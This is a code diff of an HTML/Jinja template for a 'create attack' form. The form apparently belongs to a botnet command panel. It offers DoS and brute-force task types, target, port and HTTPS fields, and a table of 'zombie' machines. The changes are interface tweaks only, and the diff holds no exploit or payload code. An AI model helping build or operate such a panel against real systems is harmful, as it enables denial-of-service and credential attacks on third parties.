@@ -7,7 +7,7 @@
   {{ create_attack.form.hidden_tag() }}
 
   <div class="field-row-stacked">
-  {% if create_attack.error %}
+  {% if create_attack.error and not 'zombie' in create_attack.error %}
     <span class="error">{{ create_attack.error }}</span>
   {% endif %}
   </div>
@@ -24,17 +24,37 @@
   </div>
 
   <div class="field-row-stacked">
+
     <!-- validation error -->
       {% for error in create_attack.form.target.errors %}
         <span class="error">{{ error }}</span>
       {% endfor %}
+
       <div class="label"><span class="margin-right-icon">🎯 </span>
         {{ create_attack.form.target.label }}
       </div>
       {{ create_attack.form.target }}
+
+
+      {% if task_type == 'dos' or task_type == 'brt' %}
+        <div style="text-align: right;">
+          <!-- validation error -->
+          {% for error in create_attack.form.port.errors %}
+            <span class="error">{{ error }}</span>
+          {% endfor %}
+
+          {{ create_attack.form.port.label }}
+          {{ create_attack.form.port(style="width: 5rem;") }}
+          {% if task_type == 'dos' %}
+            {{ create_attack.form.https }}
+            {{ create_attack.form.https.label }}
+          {% endif %}
+        </div>
+      {% endif %}
+
   </div>
 
-  {% if 'dos' in data_type %}
+  {% if task_type == 'dos' %}
     <div class="field-row-stacked">
       <!-- validation error -->
       {% for error in create_attack.form.attack_type.errors %}
@@ -46,7 +66,7 @@
       {{ create_attack.form.attack_type }}
     </div>
 
-  {% elif 'brt' in data_type %}
+  {% elif task_type == 'brt' %}
     <div class="field-row-stacked">
       <!-- validation error -->
       {% for error in create_attack.form.attack_type.errors %}
@@ -83,6 +103,12 @@
     {% endwith %}
   </fieldset>
   <br>
+
+  {% if create_attack.error and 'zombie' in create_attack.error %}
+  <div class="field-row-stacked">
+    <span class="error" style="margin-top: -1.5rem;">{{ create_attack.error }}</span>
+  </div>
+  {% endif %}
 
   {% with data=create_attack.zombies_data, data_type = 'zombies', brief=True, scrollable_table=True, max_height="25rem" %}
     {% include 'objects/tables/data/zombies.html' %}
